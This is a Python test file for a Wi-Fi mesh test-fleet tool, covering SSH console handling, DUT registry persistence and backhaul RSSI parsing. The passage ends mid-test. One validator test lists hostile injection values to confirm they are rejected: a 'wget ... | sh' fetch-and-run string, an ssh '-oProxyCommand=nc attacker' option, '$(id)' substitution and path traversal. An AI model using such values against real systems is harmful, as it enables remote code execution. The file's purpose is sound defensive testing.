from __future__ import annotations

import asyncio
import contextlib
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from fastapi import HTTPException
from pydantic import ValidationError

import app.dut.registry as registry_mod
from app.api.fleet_api import RemoteNodeBody, capture_rssi, configure_node, connect_node
from app.services.wifi_clients import classify_backhaul, parse_iwconfig_links
from app.dut.registry import REMOTE_PORT_MAX, DutRegistry
from app.parser.sysmon_parser import SysMonParser
from app.serial.serial_worker import SSH_CAPTURE_TIMEOUT_SEC, SerialWorker


REMOTE = {
    "host": "pi-node-1.local",
    "user": "dut",
    "key_path": "/run/secrets/fleet_key",
    "port": 22,
    "device": "/dev/ttyUSB0",
    "baudrate": 115200,
    "is_mesh": True,
    "backhaul_iface": "ath16",
}


# Captured from an AP6 420 mesh node over its own console (2026-08-19). The
# Master VAPs' noise-floor readings are the trap this parser exists to avoid:
# every one of them reports a Signal level. ath15/ath14 are the backhaul pair;
# ath8 shares the band but not the ESSID, and must not be mistaken for it.
IWCONFIG_AP6420 = (
    'ath15     IEEE 802.11axa  ESSID:"dutBrowser_Backhaul - PD1005VMG3"  \n'
    "          Mode:Managed  Frequency:5.22 GHz (Channel 44)  Access Point: CE:4F:86:95:CE:E5   \n"
    "          Bit Rate:573.5 Mb/s   Tx-Power:24 dBm   \n"
    "          Link Quality=94/94  Signal level=-37 dBm  Noise level=-92 dBm (BDF averaged NF value in dBm)\n"
    'ath0      IEEE 802.11axg  ESSID:"!!3290-1"  \n'
    "          Mode:Master  Frequency:2.462 GHz (Channel 11)  Access Point: CA:4F:86:89:F1:68   \n"
    "          Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm (BDF averaged NF value in dBm)\n"
    'ath14     IEEE 802.11axa  ESSID:"dutBrowser_Backhaul - PD1005VMG3"  \n'
    "          Mode:Master  Frequency:5.22 GHz (Channel 44)  Access Point: CE:4F:86:89:F1:69   \n"
    "          Link Quality=0/94  Signal level=-92 dBm  Noise level=-92 dBm (BDF averaged NF value in dBm)\n"
    'ath8      IEEE 802.11axa  ESSID:"!!3290-1"  \n'
    "          Mode:Master  Frequency:5.22 GHz (Channel 44)  Access Point: C8:4F:86:89:F1:69   \n"
    "          Link Quality=0/94  Signal level=-92 dBm  Noise level=-92 dBm (BDF averaged NF value in dBm)\n"
    "soc1      no wireless extensions.\n"
    "\n"
    "ifb2      no wireless extensions.\n"
)

# A root: Master VAPs only, so nothing to pair an uplink against.
IWCONFIG_ROOT_ONLY = (
    'ath16     IEEE 802.11axa  ESSID:"dutBrowser_Backhaul - PD1005VMG3"  \n'
    "          Mode:Master  Frequency:5.22 GHz (Channel 44)  Access Point: CE:4F:86:89:F1:69   \n"
    "          Link Quality=0/94  Signal level=-92 dBm  Noise level=-92 dBm\n"
    "soc1      no wireless extensions.\n"
)

# Captured from the AP6 840E acting as mesh root (2026-08-19). Nothing here
# marks ath22 as the backhaul: it is Master like the other three, and its
# "!!3290-1" neighbours are ordinary client VAPs. Only another DUT can name it
# — ath22's BSSID is what the node reports as its uplink peer.
IWCONFIG_ROOT_AP6840E = (
    'ath22     IEEE 802.11axa  ESSID:"dutBrowser_Backhaul - PD1005VMG3"  \n'
    "          Mode:Master  Frequency:5.22 GHz (Channel 44)  Access Point: CE:4F:86:95:CE:E5   \n"
    "          Link Quality=0/94  Signal level=-91 dBm  Noise level=-91 dBm (BDF averaged NF value in dBm)\n"
    'ath0      IEEE 802.11axg  ESSID:"!!3290-1"  \n'
    "          Mode:Master  Frequency:2.437 GHz (Channel 6)  Access Point: C8:4F:86:95:CE:E4   \n"
    "          Link Quality=0/94  Signal level=-93 dBm  Noise level=-93 dBm (BDF averaged NF value in dBm)\n"
    'ath32     IEEE 802.11axa  ESSID:"!!3290-1"  \n'
    "          Mode:Master  Frequency:6.755 GHz (Channel 161)  Access Point: CA:4F:86:66:2F:A0   \n"
    "          Link Quality=0/94  Signal level=-90 dBm  Noise level=-90 dBm (BDF averaged NF value in dBm)\n"
    'ath16     IEEE 802.11axa  ESSID:"!!3290-1"  \n'
    "          Mode:Master  Frequency:5.22 GHz (Channel 44)  Access Point: C8:4F:86:95:CE:E5   \n"
    "          Link Quality=0/94  Signal level=-91 dBm  Noise level=-91 dBm (BDF averaged NF value in dBm)\n"
)


class _Ws:
    def emit_from_thread(self, event: dict) -> None:
        pass


@contextlib.contextmanager
def _registries_under(root: Path):
    """Yield a factory for registries whose duts.json and snapshots live in `root`."""
    loop = asyncio.new_event_loop()
    with (
        mock.patch.object(registry_mod, "DUTS_FILE", root / "duts.json"),
        mock.patch.object(registry_mod, "snapshot_file_for", lambda d: root / f"{d}.jsonl"),
    ):
        try:
            yield lambda: DutRegistry(_Ws(), loop)
        finally:
            loop.close()


class RemoteRegistryTests(unittest.TestCase):
    def test_remote_round_trip_keeps_secret_server_side(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            with _registries_under(root) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                persisted = json.loads((root / "duts.json").read_text())
                self.assertEqual(persisted[0]["remote"]["key_path"], REMOTE["key_path"])

                restored = make_registry()
                restored.load_persisted()
                self.assertEqual(restored.get("mesh1").remote, REMOTE)
                public = restored.describe()[0]["remote"]
                self.assertEqual(public["host"], REMOTE["host"])
                self.assertNotIn("key_path", public)
                self.assertNotIn("user", public)

    def test_re_pointing_a_node_drops_the_previous_console_s_capture(self) -> None:
        """A capture describes the console it was read from, and an id can be
        re-pointed at another Pi (the Settings card calls it "Update node").

        Kept, the old device's role, uplink and children are served through
        /api/duts as the new device's current state, where nothing downstream
        can tell them from a fresh measurement.
        """
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                context = registry.get("mesh1")
                context.backhaul_uplink = {"iface": "ath15", "rssi": -37, "peer_mac": "c8:4f:86:95:ce:e5"}
                context.backhaul_downlink = {"iface": "ath14", "source": "detected", "peers": []}
                context.backhaul_role = "node"
                context.backhaul_captured = True

                registry.configure_remote("mesh1", {**REMOTE, "host": "pi-node-2.local"})

                described = registry.describe()[0]
                self.assertEqual(described["remote"]["host"], "pi-node-2.local")
                public = described["backhaul"]
                self.assertIsNone(public["uplink"], "the old Pi's uplink is served as the new one's")
                self.assertIsNone(public["downlink"])
                self.assertIsNone(public["role"], "a role measured on another console")
                self.assertFalse(
                    public["captured"],
                    "'measured, and there is no backhaul' is a claim about the old Pi",
                )

    #: One edit per field of a remote config, and whether it means the reading
    #: was taken somewhere else. `user`, `key_path` and `baudrate` decide how to
    #: log in and how to talk; the rest decide what is on the other end.
    CONSOLE_EDITS = {
        "host": ("pi-node-2.local", True),
        "port": (2222, True),
        "device": ("/dev/ttyUSB1", True),
        "is_mesh": (False, True),
        "backhaul_iface": ("ath22", True),
        "user": ("someone-else", False),
        "key_path": ("/run/secrets/rotated_key", False),
        "baudrate": (9600, False),
    }

    def test_a_capture_is_dropped_exactly_when_the_console_changes(self) -> None:
        """The reset and the published token are one rule or they are two bugs.

        The frontend holds captures of its own and cannot see this list; it
        compares `console_id`. So a field that clears the reading here and
        leaves the token alone means the browser re-serves what the registry
        just revoked — and a field that changes the token without clearing
        means the opposite. Asserting both against the same edit is what keeps
        them from drifting apart again.
        """
        reading = {"iface": "ath15", "rssi": -37, "peer_mac": "c8:4f:86:95:ce:e5"}
        for field, (value, elsewhere) in self.CONSOLE_EDITS.items():
            with self.subTest(field=field):
                with tempfile.TemporaryDirectory() as directory:
                    with _registries_under(Path(directory)) as make_registry:
                        registry = make_registry()
                        registry.register_dut("mesh1", "Mesh 1")
                        registry.configure_remote("mesh1", REMOTE)
                        context = registry.get("mesh1")
                        context.backhaul_uplink = dict(reading)
                        context.backhaul_downlink = {"iface": "ath14", "source": "detected", "peers": []}
                        context.backhaul_role = "node"
                        context.backhaul_captured = True
                        before = registry.describe()[0]["backhaul"]["console_id"]

                        registry.configure_remote("mesh1", {**REMOTE, field: value})

                        public = registry.describe()[0]["backhaul"]
                        self.assertEqual(
                            public["uplink"] is None, elsewhere,
                            f"changing {field}: reading dropped={public['uplink'] is None},"
                            f" expected {elsewhere}",
                        )
                        self.assertEqual(public["role"] is None, elsewhere)
                        self.assertEqual(
                            public["captured"], not elsewhere,
                            f"changing {field}: 'this console was measured' outlived the console",
                        )
                        self.assertEqual(
                            public["console_id"] != before, elsewhere,
                            f"changing {field}: the token disagrees with the reset",
                        )

    def test_the_token_never_carries_a_credential(self) -> None:
        """It is published to every client that can list DUTs."""
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                token = registry.describe()[0]["backhaul"]["console_id"]
                self.assertNotIn(REMOTE["key_path"], token)
                self.assertNotIn(REMOTE["user"], token)
                self.assertNotIn(REMOTE["host"], token)
                self.assertRegex(token, r"^[0-9a-f]{16}$")

    def test_a_persisted_entry_is_held_to_the_api_shapes(self) -> None:
        """duts.json is the weaker gate otherwise, and these values reach ssh
        as arguments or a shell as a command string."""
        for label, bad in (
            ("shell metacharacters in device", {**REMOTE, "device": "/tmp/x ; wget http://h/x -O- | sh"}),
            ("traversal in device", {**REMOTE, "device": "/dev/../tmp/x"}),
            ("shell metacharacters in iface", {**REMOTE, "backhaul_iface": "ath0; reboot"}),
            # A leading "-" would reach ssh as an option, not as a name.
            ("option-like user", {**REMOTE, "user": "-oProxyCommand=nc attacker 1234"}),
            ("option-like host", {**REMOTE, "host": "-oProxyCommand=id"}),
            ("space in user", {**REMOTE, "user": "dut root"}),
            ("command substitution in host", {**REMOTE, "host": "$(id)"}),
            ("port above the range", {**REMOTE, "port": 65536}),
            ("port below the range", {**REMOTE, "port": 0}),
        ):
            with self.subTest(case=label):
                self.assertIsNone(registry_mod._clean_remote(bad))
        self.assertEqual(registry_mod._clean_remote(dict(REMOTE)), REMOTE)
        self.assertIsNotNone(registry_mod._clean_remote({**REMOTE, "port": REMOTE_PORT_MAX}))

    def test_load_persisted_merges_and_never_clears_a_live_remote(self) -> None:
        """A saved entry from before the node had an SSH console must not wipe it."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            with _registries_under(root) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)

                (root / "duts.json").write_text(
                    json.dumps([{"id": "mesh1", "label": "Mesh 1"}]), encoding="utf-8"
                )
                registry.load_persisted()

                self.assertEqual(registry.get("mesh1").remote, REMOTE)


class SshWorkerTests(unittest.TestCase):
    def test_system_ssh_uses_batch_timeout_and_keeps_host_checking(self) -> None:
        worker = SerialWorker(SysMonParser(lambda event: None))
        process = mock.Mock()
        process.poll.return_value = None
        process.stderr.fileno.return_value = 12
        with mock.patch("app.serial.serial_worker.subprocess.Popen", return_value=process) as popen:
            with mock.patch("app.serial.serial_worker.select.select", return_value=([12], [], [])):
                with mock.patch("app.serial.serial_worker.os.read", return_value=b"__DUT_FLEET_READY__\n"):
                    worker._open_ssh(REMOTE, 115200)
        command = popen.call_args.args[0]
        self.assertEqual(command[0], "ssh")
        self.assertIn("BatchMode=yes", command)
        self.assertTrue(any(str(arg).startswith("ConnectTimeout=") for arg in command))
        self.assertFalse(any("StrictHostKeyChecking" in str(arg) for arg in command))
        self.assertIn("exec socat - /dev/ttyUSB0,b115200,raw,echo=0", command[-1])

    def test_close_terminates_and_reaps_ssh(self) -> None:
        worker = SerialWorker(SysMonParser(lambda event: None))
        process = mock.Mock()
        process.poll.return_value = None
        worker._mode = "ssh"
        worker._ssh = process
        worker.close()
        process.terminate.assert_called_once()
        process.wait.assert_called_once_with(timeout=1.0)

    def test_ssh_capture_uses_longer_named_timeout(self) -> None:
        worker = SerialWorker(SysMonParser(lambda event: None))
        process = mock.Mock()
        process.poll.return_value = None
        process.stdin = mock.Mock()
        worker._mode = "ssh"
        worker._ssh = process
        with mock.patch.object(worker._capture_done, "wait", return_value=False) as wait:
            worker.capture_command("iwconfig", timeout=0.1)
        wait.assert_called_once_with(timeout=SSH_CAPTURE_TIMEOUT_SEC)

    def test_ssh_pipes_close_only_after_the_reader_thread_is_joined(self) -> None:
        """Closing a descriptor the reader may still be selecting on frees the
        number for reuse, and the next transport opened here can be handed it."""
        order: list[str] = []
        worker = SerialWorker(SysMonParser(lambda event: None))
        process = mock.Mock()
        process.poll.return_value = None
        for pipe in ("stdin", "stdout", "stderr"):
            getattr(process, pipe).close.side_effect = lambda name=pipe: order.append(f"close {name}")
        thread = mock.Mock()
        thread.is_alive.return_value = True
        thread.join.side_effect = lambda timeout=None: order.append("join")
        worker._mode = "ssh"
        worker._ssh = process
        worker._thread = thread

        worker.close()

        self.assertEqual(order[0], "join")
        self.assertEqual(set(order[1:]), {"close stdin", "close stdout", "close stderr"})

    def test_a_failed_open_still_releases_the_pipes(self) -> None:
        """No reader exists on that path, so nothing may hold the descriptors."""
        worker = SerialWorker(SysMonParser(lambda event: None))
        process = mock.Mock()
        process.poll.return_value = 255
        process.stderr.fileno.return_value = 12
        process.stderr.read.return_value = b"ssh: connect to host pi-node-1.local port 22: No route\n"
        with mock.patch("app.serial.serial_worker.subprocess.Popen", return_value=process):
            with mock.patch("app.serial.serial_worker.select.select", return_value=([], [], [])):
                with self.assertRaises(RuntimeError):
                    worker._open_ssh(REMOTE, 115200)
        process.stdin.close.assert_called_once()
        process.stdout.close.assert_called_once()
        process.stderr.close.assert_called_once()

    def test_missing_socat_error_is_actionable(self) -> None:
        worker = SerialWorker(SysMonParser(lambda event: None))
        worker._ssh_stderr = [b"sh: socat: command not found\n"]
        self.assertIn("install socat", worker._ssh_error_detail())


class RemoteNodeApiTests(unittest.TestCase):
    def test_blank_key_path_is_refused_by_the_body_model(self) -> None:
        with self.assertRaises(ValidationError):
            RemoteNodeBody(id="mesh1", host="pi-node-1.local", user="dut", key_path="   ")

    def test_a_rejected_configuration_leaves_no_dut_behind(self) -> None:
        """The DUT exists only to carry the config; a 400 must not strand one."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            with _registries_under(root) as make_registry:
                registry = make_registry()
                request = mock.Mock()
                request.app.state.dut_registry = registry
                body = RemoteNodeBody(
                    id="mesh1",
                    host=REMOTE["host"],
                    user=REMOTE["user"],
                    key_path=REMOTE["key_path"],
                    backhaul_iface=REMOTE["backhaul_iface"],
                )
                with mock.patch.object(
                    registry, "configure_remote", side_effect=ValueError("Invalid remote")
                ):
                    with self.assertRaises(HTTPException) as caught:
                        configure_node(body, request, _admin={})

                self.assertEqual(caught.exception.status_code, 400)
                self.assertNotIn("mesh1", registry.ids())
                self.assertEqual(json.loads((root / "duts.json").read_text()), [])


def _worker_answering(replies: dict[str, str], mode: str = "ssh"):
    """A serial worker double that answers each console command in turn.

    `mode` is the transport it is holding, because that — not how the DUT is
    configured — is what decides which console a reading belongs to.
    """
    def capture(cmd: str, *args, **kwargs) -> str:
        for prefix, reply in replies.items():
            if cmd.startswith(prefix):
                return reply
        return ""
    worker = mock.Mock()
    worker.mode = mode
    worker.capture_command.side_effect = capture
    return worker


@contextlib.contextmanager
def _bench(
    replies: dict[str, str] | None = None,
    *,
    dut_id: str = "mesh1",
    remote: dict | None = None,
    mode: str = "ssh",
    port: str | None = None,
):
    """A real registry holding one DUT whose console answers from `replies`.

    A real registry rather than a `mock.Mock()`: a capture commits through the
    registry now, so a double would have to re-implement the commit to be
    observable — and would then keep passing if the real one stopped writing.
    Only the serial worker is a double, because the alternative is an AP.
    """
    with tempfile.TemporaryDirectory() as directory:
        with _registries_under(Path(directory)) as make_registry:
            registry = make_registry()
            registry.register_dut(dut_id, dut_id)
            if remote is not None:
                registry.configure_remote(dut_id, remote)
            if port is not None:
                registry.record_serial_params(dut_id, port, 115200)
            context = registry.get(dut_id)
            context.serial_worker = _worker_answering(replies or {}, mode=mode)
            request = mock.Mock()
            request.app.state.dut_registry = registry
            yield registry, context, request


class RssiCaptureTests(unittest.TestCase):
    def test_the_uplink_comes_from_iwconfig_and_the_peers_from_wlanconfig(self) -> None:
        """The two directions are different commands; asking wlanconfig for the
        uplink is what made a healthy -37 dBm link read as nothing at all."""
        with _bench({
            "iwconfig": IWCONFIG_AP6420,
            "wlanconfig ath14 list": (
                "ADDR AID CHAN TXRATE RXRATE RSSI\n"
                "00:11:22:33:44:55 1 44 866M 780M -63 00:01:02 IEEE80211_MODE_11AXA_HE80 2 2\n"
            ),
        }, remote=REMOTE) as (_registry, context, request):
            result = capture_rssi("mesh1", request)

        self.assertEqual(result["uplink"], {
            "iface": "ath15", "rssi": -37, "snr": 55, "rssi_band": "near",
            "radio_band": "5GHz", "essid": "dutBrowser_Backhaul - PD1005VMG3",
            "peer_mac": "ce:4f:86:95:ce:e5",
        })
        self.assertEqual(result["downlink"]["iface"], "ath14")
        self.assertEqual(result["downlink"]["peers"],
                         [{"mac": "00:11:22:33:44:55", "rssi": -63, "rssi_band": "mid"}])
        # The configured ath16 is not consulted: detection found the real pair.
        commands = [c.args[0] for c in context.serial_worker.capture_command.call_args_list]
        self.assertEqual(commands, ["iwconfig", "wlanconfig ath14 list"])

    def test_a_root_with_no_uplink_falls_back_to_the_configured_iface(self) -> None:
        with _bench({
            "iwconfig": IWCONFIG_ROOT_ONLY,
            "wlanconfig ath16 list": "ADDR AID CHAN\n",
        }, dut_id="root1", remote=REMOTE) as (_registry, _context, request):
            result = capture_rssi("root1", request)

        self.assertIsNone(result["uplink"])
        # Named as configured, with the SSID it actually serves, so a wrong
        # interface cannot pass itself off as a measured backhaul.
        self.assertEqual(result["downlink"], {
            "iface": "ath16", "source": "configured",
            "essid": "dutBrowser_Backhaul - PD1005VMG3", "peers": [],
        })

    def test_a_master_vaps_noise_floor_is_never_reported_as_an_uplink(self) -> None:
        """Every Master VAP reports a Signal level — the noise floor, at link
        quality 0. Reading it would put a confident -92 dBm on the card."""
        links = parse_iwconfig_links(IWCONFIG_AP6420)
        masters = [l for l in links if l["mode"] == "Master"]
        self.assertTrue(masters)
        for link in masters:
            with self.subTest(iface=link["iface"]):
                self.assertFalse(link["associated"])
                self.assertIsNone(link["rssi"])
                self.assertIsNone(link["snr"])

    def test_the_backhaul_pair_is_found_by_essid_and_band_not_by_name(self) -> None:
        found = classify_backhaul(parse_iwconfig_links(IWCONFIG_AP6420))
        self.assertEqual(found["uplink"]["iface"], "ath15")
        # ath8 is Master on the same band but a different ESSID; ath0 shares
        # neither. Only the VAP paired with the uplink's ESSID qualifies.
        self.assertEqual(found["downlink"]["iface"], "ath14")

    def test_a_root_names_its_backhaul_from_a_node_it_already_captured(self) -> None:
        """The root cannot identify ath22 alone — it is Master like the rest.
        The node's uplink peer BSSID is what picks it out, exactly."""
        with _bench({
            "iwconfig": IWCONFIG_ROOT_AP6840E,
            "wlanconfig ath22 list": (
                "ADDR AID CHAN TXRATE RXRATE RSSI\n"
                "d2:4f:86:89:f1:69 1 44 516M 516M -36 00:05:11 IEEE80211_MODE_11AXA_HE40 2 2\n"
            ),
        }, dut_id="root1", remote=REMOTE) as (registry, _root, request):
            node = registry.register_dut("mesh1", "Mesh 1")
            node.backhaul_uplink = {
                "peer_mac": "ce:4f:86:95:ce:e5",
                "essid": "dutBrowser_Backhaul - PD1005VMG3",
                "radio_band": "5GHz",
            }

            result = capture_rssi("root1", request)

        self.assertIsNone(result["uplink"])
        self.assertEqual(result["role"], "root")
        self.assertEqual(result["downlink"]["iface"], "ath22")   # not the configured ath16
        self.assertEqual(result["downlink"]["source"], "detected")
        self.assertEqual(result["downlink"]["peers"],
                         [{"mac": "d2:4f:86:89:f1:69", "rssi": -36, "rssi_band": "near"}])

    def test_the_bssid_wins_when_two_vaps_share_the_backhaul_ssid(self) -> None:
        """The reason the peer BSSID is the primary key. A root advertising the
        backhaul SSID on two radios gives ESSID matching nothing to choose by;
        the BSSID names one VAP and only one."""
        two_radios = IWCONFIG_ROOT_AP6840E.replace('ath16     IEEE 802.11axa  ESSID:"!!3290-1"',
                                                   'ath16     IEEE 802.11axa  ESSID:"dutBrowser_Backhaul - PD1005VMG3"')
        links = parse_iwconfig_links(two_radios)
        essid = "dutBrowser_Backhaul - PD1005VMG3"
        self.assertEqual(len([l for l in links if l["essid"] == essid]), 2)

        by_bssid = classify_backhaul(links, peer_bssids={"ce:4f:86:95:ce:e5"})
        self.assertEqual(by_bssid["downlink"]["iface"], "ath22")

        # Without a peer MAC the (ESSID, band) pair still names one VAP. Both
        # candidates here are 5 GHz, so this is the case the band cannot split
        # and the BSSID must: assert what it does rather than pretend it chose.
        both_5ghz = classify_backhaul(links, peer_networks={(essid, "5GHz")})
        self.assertIn(both_5ghz["downlink"]["iface"], {"ath22", "ath16"})

        # When the radios differ, the band decides and the wrong one is refused.
        self.assertIsNone(classify_backhaul(links, peer_networks={(essid, "2.4GHz")})["downlink"])

    def test_an_uncaptured_fleet_leaves_the_root_on_its_configured_iface(self) -> None:
        """The correlation reads what earlier captures stored, so a root asked
        first has nothing to go on. Stated rather than hidden."""
        found = classify_backhaul(parse_iwconfig_links(IWCONFIG_ROOT_AP6840E))
        self.assertIsNone(found["uplink"])
        self.assertIsNone(found["downlink"])

    def test_an_empty_capture_refuses_rather_than_blanking_a_live_reading(self) -> None:
        """A console mid-reconfiguration answers iwconfig with no VAPs at all.
        Storing None there blanks a live card and strips the key a root needs
        to name its backhaul VAP, so it must not be mistaken for an answer."""
        with _bench({"iwconfig": "soc1      no wireless extensions.\n"}, remote=REMOTE) as (
            _registry, context, request,
        ):
            context.backhaul_uplink = {"iface": "ath15", "rssi": -37, "peer_mac": "ce:4f:86:95:ce:e5"}

            with self.assertRaises(HTTPException) as caught:
                capture_rssi("mesh1", request)

            self.assertEqual(caught.exception.status_code, 400)
            self.assertEqual(context.backhaul_uplink["rssi"], -37)   # untouched

    def test_a_measured_node_is_labelled_a_node(self) -> None:
        with _bench({
            "iwconfig": IWCONFIG_AP6420,
            "wlanconfig ath14 list": "ADDR AID CHAN\n",
        }, remote=REMOTE) as (_registry, _context, request):
            self.assertEqual(capture_rssi("mesh1", request)["role"], "node")

    def test_a_configured_client_vap_is_not_passed_off_as_a_backhaul(self) -> None:
        """The bench had exactly this: the root's configured ath16 served an
        ordinary SSID, and one of its neighbours had a laptop on it. Reporting
        that laptop as a mesh child with no provenance is what `source` ends."""
        with _bench({
            "iwconfig": IWCONFIG_ROOT_AP6840E,
            "wlanconfig ath32 list": (
                "ADDR AID CHAN TXRATE RXRATE RSSI\n"
                "f4:3b:d8:d6:98:8b 1 161 1201M 1201M -42 00:01:02 IEEE80211_MODE_11AXA_HE80 2 2\n"
            ),
        }, dut_id="root1", remote={**REMOTE, "backhaul_iface": "ath32"}) as (
            _registry, _context, request,
        ):
            downlink = capture_rssi("root1", request)["downlink"]

        self.assertEqual(downlink["source"], "configured")
        self.assertEqual(downlink["essid"], "!!3290-1")     # visibly not a backhaul
        self.assertEqual(len(downlink["peers"]), 1)

    def test_a_dead_console_does_not_cost_the_uplink_it_already_measured(self) -> None:
        """The uplink command succeeded; only the peer table failed. Losing the
        first result means the card sits on a stale number after a retry."""
        def capture(cmd, *a, **k):
            if cmd.startswith("iwconfig"):
                return IWCONFIG_AP6420
            raise RuntimeError("Serial port is not open")

        with _bench(remote=REMOTE) as (_registry, context, request):
            context.serial_worker.capture_command.side_effect = capture

            with self.assertRaises(HTTPException) as caught:
                capture_rssi("mesh1", request)

            self.assertEqual(caught.exception.status_code, 400)
            self.assertEqual(context.backhaul_uplink["rssi"], -37)   # kept, not discarded
            self.assertEqual(context.backhaul_role, "node")

    def test_standalone_ap_is_not_applicable_without_capture(self) -> None:
        with _bench(dut_id="ap1", remote={**REMOTE, "is_mesh": False, "backhaul_iface": None}) as (
            _registry, context, request,
        ):
            result = capture_rssi("ap1", request)
            self.assertEqual(result["applicable"], False)
            context.serial_worker.capture_command.assert_not_called()


class LocalDutCaptureTests(unittest.TestCase):
    """The fleet's root is usually the DUT cabled to this machine.

    Both commands run over `capture_command`, which does not care whether the
    console is a serial port or an SSH pipe, so the measurement is available —
    it was only the SSH-configuration guard that made it unobtainable for the
    device most likely to be on someone's desk.
    """

    def test_a_cabled_root_is_named_by_the_node_that_associates_to_it(self) -> None:
        """The bench case, 2026-08-21: the AP6 on the Pi reported its parent as
        ce:4f:86:95:ce:e5, a VAP of the AP6_840E cabled to this machine."""
        with _bench({
            "iwconfig": IWCONFIG_ROOT_AP6840E,
            "wlanconfig ath22 list": (
                "ADDR AID CHAN TXRATE RXRATE RSSI\n"
                "d2:4f:86:89:f1:69 1 44 516M 516M -36 00:05:11 IEEE80211_MODE_11AXA_HE40 2 2\n"
            ),
        }, dut_id="default", mode="serial", port="/dev/cu.bench") as (registry, local, request):
            node = registry.register_dut("mesh1", "Mesh 1")
            node.backhaul_uplink = {
                "peer_mac": "ce:4f:86:95:ce:e5",
                "essid": "dutBrowser_Backhaul - PD1005VMG3",
                "radio_band": "5GHz",
            }

            result = capture_rssi("default", request)

            self.assertTrue(result["applicable"])
            self.assertEqual(result["role"], "root")
            self.assertEqual(result["downlink"]["iface"], "ath22")
            self.assertEqual(result["downlink"]["source"], "detected")
            self.assertEqual(result["downlink"]["peers"],
                             [{"mac": "d2:4f:86:89:f1:69", "rssi": -36, "rssi_band": "near"}])
            self.assertEqual(local.backhaul_role, "root")

    def test_a_cabled_node_reports_its_uplink(self) -> None:
        with _bench({
            "iwconfig": IWCONFIG_AP6420,
            "wlanconfig ath14 list": "ADDR AID CHAN\n",
        }, dut_id="default", mode="serial", port="/dev/cu.bench") as (_registry, _context, request):
            result = capture_rssi("default", request)

        self.assertEqual(result["role"], "node")
        self.assertEqual(result["uplink"]["rssi"], -37)
        self.assertEqual(result["downlink"]["iface"], "ath14")

    def test_a_cabled_dut_with_no_backhaul_is_not_called_a_root(self) -> None:
        """A standalone AP has no parent either, and nothing here declared this
        DUT meshed. Reporting "None — this is the root" would be a wrong answer
        on the most common desk setup there is: one AP, one cable."""
        with _bench({"iwconfig": IWCONFIG_ROOT_AP6840E}, dut_id="default", mode="serial",
                    port="/dev/cu.bench") as (_registry, context, request):
            result = capture_rssi("default", request)

        self.assertIsNone(result["role"])
        self.assertIsNone(result["downlink"], "no configuration to fall back to, and none wanted")
        self.assertTrue(
            result["captured"],
            "'measured, and there is no backhaul here' is not 'nobody has looked'",
        )
        # One command, not two: there is no interface to ask wlanconfig about.
        commands = [c.args[0] for c in context.serial_worker.capture_command.call_args_list]
        self.assertEqual(commands, ["iwconfig"])

    def test_a_cabled_duts_capture_reaches_the_card(self) -> None:
        """Served at the top level, because a DUT with no SSH configuration has
        no `remote` block for it to be nested in — the reading existed and the
        browser could not see it."""
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                context = registry.register_dut("bench", "Bench AP")
                context.backhaul_role = "root"
                context.backhaul_uplink = None
                context.backhaul_downlink = {"iface": "ath22", "source": "detected", "peers": []}
                context.backhaul_captured = True

                published = registry.describe()[0]
                self.assertIsNone(published["remote"])
                self.assertTrue(published["backhaul"]["applicable"])
                self.assertEqual(published["backhaul"]["role"], "root")
                self.assertEqual(published["backhaul"]["downlink"]["iface"], "ath22")
                self.assertRegex(published["backhaul"]["console_id"], r"^[0-9a-f]{16}$")

    def test_moving_the_cable_drops_the_previous_devices_capture(self) -> None:
        """The local half of the rule `configure_remote` applies to a node: this
        bench has two USB adapters, and re-opening a DUT id on the other one is
        a different device answering the same card."""
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                context = registry.register_dut("bench", "Bench AP")
                registry.record_serial_params("bench", "/dev/cu.PL2303G-USBtoUART1120", 115200)
                context.backhaul_role = "root"
                context.backhaul_downlink = {"iface": "ath22", "source": "detected", "peers": []}
                context.backhaul_captured = True
                context.backhaul_console = registry_mod.console_token(context, "serial")
                before = registry.describe()[0]["backhaul"]["console_id"]

                # Same port, different baud: how to talk to the console, not
                # which console it is. The reading still stands.
                registry.record_serial_params("bench", "/dev/cu.PL2303G-USBtoUART1120", 9600)
                self.assertEqual(registry.describe()[0]["backhaul"]["role"], "root")
                self.assertEqual(registry.describe()[0]["backhaul"]["console_id"], before)

                registry.record_serial_params("bench", "/dev/cu.PL2303G-USBtoUART1130", 115200)

                published = registry.describe()[0]["backhaul"]
                self.assertIsNone(published["role"])
                self.assertIsNone(published["downlink"])
                self.assertFalse(published["captured"])
                self.assertNotEqual(
                    published["console_id"], before,
                    "the token the browser compares must move with the reset",
                )

    def test_a_capture_belongs_to_the_transport_it_ran_over_not_the_config(self) -> None:
        """A registered node can be opened on a cable at this desk.

        `/api/serial/open` takes any DUT id, and `capture_command` writes to
        whichever transport the worker holds — so a node with an SSH console
        configured, opened locally, is captured over the cable. Filing that
        reading against its Pi is the exact mislabelling `console_id` exists to
        prevent, and it would be served back as the Pi's the next time the node
        connects.
        """
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                context = registry.get("mesh1")
                registry.record_serial_params("mesh1", "/dev/cu.at-my-desk", 115200)
                context.serial_worker = _worker_answering({
                    "iwconfig": IWCONFIG_AP6420,
                    "wlanconfig ath14 list": "ADDR AID CHAN\n",
                }, mode="serial")
                request = mock.Mock()
                request.app.state.dut_registry = registry

                result = capture_rssi("mesh1", request)

                self.assertEqual(
                    result["console_id"], registry_mod.console_token(context, "serial"),
                    "the answer must name the console that answered, not the one asked about",
